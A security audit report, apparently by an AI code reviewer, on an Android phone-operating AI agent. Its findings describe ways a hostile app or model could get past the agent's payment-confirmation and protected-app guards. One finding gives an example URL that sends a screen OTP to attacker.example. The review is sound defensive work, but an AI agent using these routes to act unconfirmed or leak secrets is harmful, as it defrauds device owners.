@@ -1,0 +1,46 @@
+GPT-6 (Codex); 263 repository files read, including 54 reviewed in full.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/Guard.kt:71 - In the currently unwired harness, a planned app can expose a committing button as “₹250”, an unlabeled icon, “P\u200Bay”, “Pagar”, or child texts “P” and “ay”; ScreenReader preserves or produces labels that miss the commit matcher, and ToolRunner executes the tap without confirmation. Commit text after the 80-character label cutoff also disappears before checking. Smallest fix: require confirmation for taps unless the control is explicitly established as noncommitting.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/android/AccessibilityDriver.kt:54 - Show “Add” while StepLoop reads the screen, then change that same accessibility node to “Pay” while the model is answering. Guard checks the old “Add” element, but live(handle) refreshes the node and ACTION_CLICK executes its current payment action without asking. Smallest fix: revalidate the current package, target identity, label and flags immediately before execution, refusing changed targets.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/android/AccessibilityDriver.kt:55 - Put a nonclickable editable child labeled “Amount” inside a clickable parent labeled “Pay”; ScreenReader lists both controls, and the model selects tap on “Amount”. Guard allows that label, but the driver climbs to the clickable parent and clicks “Pay” without confirmation. Smallest fix: remove ancestor climbing and coordinate fallback, and execute only the exact clickable target checked by Guard.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/ToolRunner.kt:103 - After the owner approves “Pay”, return a screen with identical visual ordering, labels and flags but swap the tree positions of “Pay” and “Delete”. ScreenReader’s hash excludes handles and coordinates, so the reread passes; it replaces the driver’s handle map, while perform still uses the old handle, now pointing to “Delete”. Smallest fix: bind approval to target identity and bounds, and execute the freshly resolved target rather than the old element.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/Guard.kt:75 - In a planned app, focus a field whose IME action sends or pays, with a visible button labeled “Send message” or “Proceed to pay”. press_enter is allowed because neither label matches isWholeCommit, and AccessibilityDriver invokes ACTION_IME_ENTER on the focused field. Smallest fix: require confirmation for enter unless the focused field’s action is explicitly known to be noncommitting.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/android/AccessibilityDriver.kt:97 - Expose a scrollable payment control labeled “Slide to pay” whose ACTION_SCROLL_FORWARD commits; the model’s scroll call bypasses commit checking entirely. With no scrollable node, scroll instead dispatches a physical swipe, including when the screen is unreadable and its package is unknown. Smallest fix: refuse scrolling on unreadable screens and require confirmation for unknown scroll or swipe targets.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/android/AccessibilityDriver.kt:117 - From a planned app, the model opens an allowed https link handled by an unplanned or blocked package. Guard checks only the scheme and current package; the implicit ACTION_VIEW launches the destination before any destination scope or protected-app check, and an attacker-controlled handler can commit upon receiving it. Smallest fix: resolve and check the destination before launching, use an explicit destination, and require confirmation for links whose effects are unknown.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/ToolRunner.kt:159 - The model can copy screen text into open_link text, such as https://attacker.example/collect?code=123456, while operating a planned app. ToolRunner forwards the complete URI to an external ACTION_VIEW handler without confirmation or a sharing-policy check, allowing a browser or attacker-controlled handler to transmit the screen-derived text. Smallest fix: prohibit model-built outbound links from screen-bearing turns while sharing is off.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/ScreenReader.kt:54 - Display an OTP as ordinary text or as the value of an unflagged edit field, even one labeled “OTP” or “Password”. ScreenReader includes it in the local model prompt; read_screen bypasses protected-app checks, and the hostile model can return the value through done, which StepLoop writes into the run log and outcome. Smallest fix: redact secret-bearing fields and screens before compaction, and refuse reads of protected apps.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/Guard.kt:61 - A planned app exposes its password, PIN or card entry as an unflagged field labeled “Search”, with no recognized secret wording elsewhere. A schema-valid type call reaches ACTION_SET_TEXT, and argsText records the supplied secret because hiding also depends on the misleading label or password flag. Smallest fix: restrict typing to approved nonsecret fields and reject unknown field purposes.
+
+HIGH app/app/src/main/java/com/swarmos/app/hands/ToolRunner.kt:83 - Install an app with package com.example.cash and label “Bank”, then have the planner name it as the PHONE app. AppMatch resolves the label to the package before Guard checks it, so the blocked label is discarded and the app opens and accepts ordinary actions without refusal. Smallest fix: check the resolved application label as well as its package; unknown packages still need a fail-closed policy.
+
+MEDIUM app/app/src/main/java/com/swarmos/app/hands/android/AppCatalog.kt:35 - An attacker app declares a MAIN/CATEGORY_HOME activity and brings its window forward during another app’s subtask. AppCatalog includes every matching home package, and Guard automatically includes those packages in known, allowing actions inside the attacker app without the owner approving the scope change. Smallest fix: remove blanket launcher-package approval and narrowly permit only required home navigation.
+
+MEDIUM app/app/src/main/java/com/swarmos/app/hands/android/ScreenMapping.kt:92 - An attacker accessibility provider supplies many child IDs whose lookups return null; those attempts do not increment seen, bypassing the 1,500-node work limit. Traversal runs synchronously without cancellation checks, so Stop marks the run stopped but cannot release the active run until the traversal finishes. Smallest fix: cap attempted child lookups and check cancellation during traversal.
+
+Checks that hold:
+External intent parsing never enables autostart; the sheet’s task-start path requires Run.
+Session tokens use 128 random bits, expire after 30 seconds and redeem once; session provenance does not bypass Run.
+No reviewed intent or notification action answers a confirmation.
+PromptBoard rejects stale IDs, requires 700 milliseconds of visibility for yes, and treats timeout, dismissal and cancellation as no.
+Flagged password-node text is not fetched by AccessibilityDriver; its compacted value is empty and typing is refused.
+The driver refuses tap, type, scroll and enter when its current window check identifies Ustaad’s application window.
+Listed commit words match case-insensitively; listed English and Hindi labels trigger confirmation.
+upi:, intent:, file:, content:, javascript: and ustaad: links are refused.
+Step prompts, reply completions with outcomes, and fallback knowledge completions with outcomes set onPhoneOnly=true.
+Completing PHONE loops have step limits, repeated-screen detection and refusal limits.
+Accessibility and voice-interaction services declare system binding permissions; the Stop receiver is not exported.
+
+Not examined:
+Production runtime behavior: application source contains no HandsEngine construction, HandsHub.hands assignment, production Brain or ExpertDesk implementation, or Stop-control wiring. The harness findings above are latent code paths, not established reachable exploits in this checkout.
+Cluster/expert transport, sharing-switch enforcement, MCP exposure and persisted run-log handling lack production implementations to trace.
+Stock-app behavior for tel:, sms:, mailto:, market: and payment links; merged manifests and device-specific overlay behavior.
+No builds, tests, network calls or device execution were performed.
